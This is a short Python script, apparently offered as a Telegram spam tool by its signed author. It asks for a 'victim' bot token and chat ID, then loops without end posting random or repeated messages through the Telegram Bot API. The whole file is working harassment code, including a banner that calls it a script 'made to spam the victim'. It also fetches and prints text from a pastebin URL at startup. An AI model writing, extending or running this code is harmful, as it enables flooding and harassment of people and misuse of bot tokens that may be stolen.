import time,sys,pyfiglet,requests,os,random,sys
from random import choice
#BY : @NiXXR
''' 
 ____    ____       _      __  __ 
/ ___|  |  _ \     / \    |  \/  |
\___ \  | |_) |   / _ \   | |\/| |
 ___) | |  __/   / ___ \  | |  | |
|____/  |_|     /_/   \_\ |_|  |_|
            
                        BY : @NiXXR
                         ____     ___    _____ 
                        | __ )   / _ \  |_   _|
                        |  _ \  | | | |   | |
                        | |_) | | |_| |   | |
                        |____/   \___/    |_|
                                                 '''
def UAP() :
    def Nix(PWT):
    	
        for e in PWT:
         sys.stdout.write(e) 
         sys.stdout.flush() 
         time.sleep(1/88)
    tok = input("\033[1;92m[$] Enter victim Token : ")
    ID = input("\033[1;92m[$] Enter victim Telegram ID : ")
    Nix("\033[1;91m"+requests.get("https://pastebin.com/raw/0m62t13g").text)
    print("\nScript made to spam the victim with bot token and id  by https://t.me/NiXXR \n")
    choose = input("\033[1;92m1. random message\n2. special repeated message\n3. one special message\n[+] Choose one of these numbers : \033[1;91m")
    os.system("clear")
    hack1 = "123567890qwertyuiopasdf!@#$%^&*()_+/*-\":ghjklzxcvbnm"
    if choose=="1":
        while True:
            hack2 = str("".join(choice(hack1)for i in range(8)))
            Y= f'''https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text={hack2}'''
            req = requests.session().post(Y)
            print("\033[1;94mThe message has been sent successfully ✔")
    if choose=="2":
        hack3 = input("Enter The Message: ")
        while True:
            Y1= f'''https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text={hack3}'''
            req = requests.session().post(Y1)
            print("\033[1;94mThe message has been sent successfully ✔")
    if choose=="3":
        hack4 = input("Enter the message : ")#one message only
        Y2= f'''https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text={hack4}'''
        req = requests.session().post(Y2)
        print("\033[1;94mThe message has been sent successfully ✔")
    #By @NiXXR
    